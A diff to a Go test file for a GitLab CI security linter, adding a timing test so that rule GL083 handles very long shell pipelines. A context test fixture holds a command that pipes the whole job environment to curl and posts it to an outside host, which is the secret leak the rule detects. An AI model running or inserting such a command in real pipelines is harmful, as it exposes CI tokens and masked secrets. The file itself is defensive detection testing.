@@ -6,6 +6,7 @@ package rules
 import (
 	"strings"
 	"testing"
+	"time"
 
 	"github.com/glsec/glsec/internal/finding"
 	"github.com/glsec/glsec/internal/parser"
@@ -335,5 +336,19 @@ func TestGL083_EnvironmentMessage(t *testing.T) {
 	f := findings083(t, "job:\n  script:\n    - env | curl --data-binary @- https://ci.example.org/hook\n")
 	if len(f) != 1 || !strings.Contains(f[0].Message, "CI_JOB_TOKEN and every masked variable") {
 		t.Errorf("expected the environment message, got %+v", f)
+	}
+}
+
+func TestGL083_LongPipelineIsLinear(t *testing.T) {
+	src := "job:\n  script:\n    - \"" + strings.Repeat("env | ", 20000) + "cat\"\n"
+	done := make(chan []finding.Finding)
+	go func() { done <- findings083(t, src) }()
+	select {
+	case fs := <-done:
+		if len(fs) != 0 {
+			t.Errorf("got %d findings, want 0", len(fs))
+		}
+	case <-time.After(5 * time.Second):
+		t.Fatal("a 20000-stage pipeline did not finish in 5s")
 	}
 }
